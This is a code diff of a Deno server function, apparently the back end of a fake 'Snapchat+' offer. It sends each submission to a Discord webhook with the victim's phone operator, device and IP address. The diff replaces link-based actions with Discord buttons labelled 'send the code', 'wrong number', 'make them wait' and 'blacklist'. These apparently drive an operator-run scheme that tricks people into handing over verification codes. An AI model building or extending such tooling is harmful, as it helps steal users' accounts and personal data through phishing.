@@ -44,15 +44,6 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-  const redirectUri = `${appUrl}/api/discord-callback`;
-  const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${Deno.env.get("DISCORD_APP_ID")}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify`;
-  
-  const triggerUrl = `${discordAuthUrl}&state=${submissionId}&action=code_ready`;
-  const wrongUrl = `${discordAuthUrl}&state=${submissionId}&action=wrong`;
-  const waitUrl = `${discordAuthUrl}&state=${submissionId}&action=wait`;
-  const blacklistUrl = `${discordAuthUrl}&state=${submissionId}&action=blacklist`;
-
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -66,20 +57,47 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
-      {
-        name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
-        inline: false
-      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
+  const components = [
+    {
+      type: 1,
+      components: [
+        {
+          type: 2,
+          style: 3,
+          label: "✅ Envoyer le code",
+          custom_id: `send:${submissionId}`
+        },
+        {
+          type: 2,
+          style: 4,
+          label: "❌ Mauvais numéro",
+          custom_id: `wrong:${submissionId}`
+        },
+        {
+          type: 2,
+          style: 3,
+          label: "⏳ Faire patienter",
+          custom_id: `wait:${submissionId}`
+        },
+        {
+          type: 2,
+          style: 4,
+          label: "🚫 Blacklist",
+          custom_id: `blacklist:${submissionId}`
+        }
+      ]
+    }
+  ];
+
   await fetch(DISCORD_WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+    body: JSON.stringify({ content: "@everyone", embeds: [embed], components }),
   });
 
   await base44.asServiceRole.entities.ActionLog.create({
